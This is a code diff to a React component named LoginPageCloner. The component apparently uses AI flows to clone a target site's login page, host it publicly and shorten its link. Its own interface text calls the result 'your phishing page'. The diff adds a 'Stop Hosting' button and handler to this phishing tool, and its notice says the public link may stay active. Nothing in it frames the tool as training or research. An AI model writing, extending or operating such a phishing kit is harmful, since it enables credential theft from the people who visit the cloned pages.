@@ -9,7 +9,7 @@ import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter }
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot, Globe, Copy, Wand } from 'lucide-react';
+import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot, Globe, Copy, Wand, StopCircle } from 'lucide-react';
 import { cloneLoginPage } from '@/ai/flows/page-cloner-flow';
 import { hostClonedPage } from '@/ai/flows/host-cloned-page-flow';
 import { shortenUrl } from '@/services/url-shortener-service';
@@ -83,6 +83,14 @@ export function LoginPageCloner() {
     } finally {
       setIsHosting(false);
     }
+  };
+  
+  const handleStopHosting = () => {
+    resetState();
+    toast({
+      title: "Hosting Deactivated",
+      description: "The public URL has been removed from this interface. Note: The link may remain active on the public service.",
+    });
   };
 
   const handleShortenUrl = async () => {
@@ -200,12 +208,18 @@ export function LoginPageCloner() {
                   <p className="text-xs text-muted-foreground">This is a publicly accessible, shareable link to your phishing page.</p>
                 </div>
 
-                {!shortUrl && (
-                    <Button onClick={handleShortenUrl} disabled={isShortening} className="w-full">
-                        {isShortening ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Wand className="mr-2 h-4 w-4"/>}
-                        Create Short Link
+                <div className="flex flex-wrap gap-2">
+                    {!shortUrl && (
+                        <Button onClick={handleShortenUrl} disabled={isShortening} className="flex-grow">
+                            {isShortening ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Wand className="mr-2 h-4 w-4"/>}
+                            Create Short Link
+                        </Button>
+                    )}
+                     <Button onClick={handleStopHosting} variant="destructive" className="flex-grow">
+                        <StopCircle className="mr-2 h-4 w-4" />
+                        Stop Hosting
                     </Button>
-                )}
+                </div>
                 
                  {shortUrl && (
                   <div className="space-y-2 animate-in fade-in">
